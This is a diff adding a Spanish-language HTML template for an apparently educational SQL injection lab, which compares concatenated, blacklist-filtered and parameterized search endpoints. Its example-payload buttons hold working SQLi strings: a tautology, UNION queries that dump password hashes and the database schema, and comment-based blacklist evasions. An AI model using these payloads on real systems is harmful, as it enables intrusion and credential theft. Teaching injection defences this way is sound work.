@@ -1,0 +1,30 @@
+{% extends "base.html" %}
+{% block title %}Lab SQLi - MiniRed{% endblock %}
+{% block content %}
+<div class="tarjeta" id="sqli-lab">
+  <h1>Laboratorio de SQL Injection</h1>
+  <p class="nota">Buscador de usuarios por nombre. El mismo input se envía a las 3 versiones del endpoint
+    (estas no dependen del interruptor de modo de arriba).</p>
+
+  <label>Búsqueda <input id="sqli-q" value="ali" autocomplete="off"></label>
+  <div class="botones">
+    <button data-version="v1">v1 · concatenación</button>
+    <button data-version="v2">v2 · lista negra</button>
+    <button data-version="v3">v3 · parametrizada</button>
+    <button data-version="todas" class="secundario">Probar las 3</button>
+  </div>
+
+  <h2>Payloads de ejemplo</h2>
+  <div class="payloads">
+    <button class="payload" data-p="ali">Normal: ali</button>
+    <button class="payload" data-p="'">Comilla suelta: '</button>
+    <button class="payload" data-p="' OR 1=1--">Tautología: ' OR 1=1--</button>
+    <button class="payload" data-p="' UNION SELECT id, username, password_hash, email FROM users--">UNION: volcar hashes</button>
+    <button class="payload" data-p="' UNION SELECT 1, name, sql, type FROM sqlite_master--">UNION: esquema de la BD</button>
+    <button class="payload" data-p="'OR 1=1/*">Evasión v2: 'OR 1=1/*</button>
+    <button class="payload" data-p="'/**/UNION/**/SELECT/**/id,username,password_hash,email/**/FROM/**/users/*">Evasión v2: UNION con /**/</button>
+  </div>
+
+  <div id="sqli-salida"></div>
+</div>
+{% endblock %}
